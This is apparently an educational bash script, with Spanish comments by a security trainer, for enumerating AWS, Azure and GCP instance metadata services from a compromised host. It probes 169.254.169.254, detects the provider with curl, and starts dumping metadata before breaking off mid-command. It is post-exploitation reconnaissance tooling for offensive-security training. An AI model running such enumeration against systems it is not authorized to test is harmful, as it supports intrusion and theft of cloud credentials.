#!/usr/bin/env bash
# ------------------------------------------------------------
# Script: cloud_metadata_enum.sh
# Autor: Raul Renales
# Formación y cursos: https://raulrenales.es
#
# Descripción:
#   Enumeración de servicios de metadatos en entornos cloud
#   (AWS, Azure, GCP) desde una máquina comprometida.
#
# Uso:
#   Exclusivamente educativo y en entornos autorizados.
# ------------------------------------------------------------

set -euo pipefail
IFS=$'\n\t'

OUTDIR="cloud_metadata_enum_$(hostname)_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUTDIR"

log() {
  echo "[*] $1"
}

section() {
  echo -e "\n===== $1 =====" | tee -a "$OUTDIR/summary.txt"
}

log "Iniciando enumeración de metadatos cloud..."
log "Resultados en: $OUTDIR"

# IP estándar de metadatos cloud
METADATA_IP="169.254.169.254"

# ------------------------------------------------------------
section "Comprobación de acceso a metadata service"
# ------------------------------------------------------------
if curl -s --connect-timeout 2 "http://${METADATA_IP}" &>/dev/null; then
  echo "Metadata service accesible en ${METADATA_IP}" | tee "$OUTDIR/metadata_access.txt"
else
  echo "Metadata service NO accesible" | tee "$OUTDIR/metadata_access.txt"
fi

# ------------------------------------------------------------
section "Detección de proveedor cloud"
# ------------------------------------------------------------
PROVIDER="Desconocido"

if curl -s --connect-timeout 2 "http://${METADATA_IP}/latest/meta-data/" &>/dev/null; then
  PROVIDER="AWS"
elif curl -s --connect-timeout 2 -H "Metadata:true" \
     "http://${METADATA_IP}/metadata/instance?api-version=2021-02-01" &>/dev/null; then
  PROVIDER="Azure"
elif curl -s --connect-timeout 2 "http://${METADATA_IP}/computeMetadata/v1/" \
     -H "Metadata-Flavor: Google" &>/dev/null; then
  PROVIDER="GCP"
fi

echo "Proveedor detectado: $PROVIDER" | tee "$OUTDIR/provider.txt"

# ------------------------------------------------------------
section "Enumeración de metadatos básicos"
# ------------------------------------------------------------
case "$PROVIDER" in
  AWS)
    curl -s "http://${METADATA_IP}/latest/meta-data/" \
      > "$
